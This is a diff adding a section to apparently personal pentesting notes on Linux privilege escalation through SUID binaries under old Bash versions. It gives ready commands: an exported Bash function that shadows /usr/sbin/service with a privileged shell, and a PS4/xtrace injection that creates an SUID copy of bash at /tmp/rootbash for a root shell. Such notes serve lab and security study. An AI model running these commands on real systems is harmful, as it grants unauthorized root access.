@@ -325,4 +325,37 @@ export PATH=/path_to_executable:$PATH
 
 </div></div>
 
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+## Bash versions <4.2-048
+- Define shell **functions** with **names** that **resemble** file paths
+- then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
+- If we have an executable `strings /usr/local/bin/suid-env2`
+`strings /usr/local/bin/suid-env2`
+`/usr/sbin/service apache2 start`
+- Create a Bash function with the name `usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved)
+```shell
+function /usr/sbin/service { /bin/bash -p; }
+```
+- export the function:
+```shell
+export -f /usr/sbin/service
+```
+- Run the executable
+## Bash <4.4
+-  If we have an executable 
+- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
+- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+```shell
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+```shell
+/tmp/rootbash -p
+```
+
+</div></div>
 
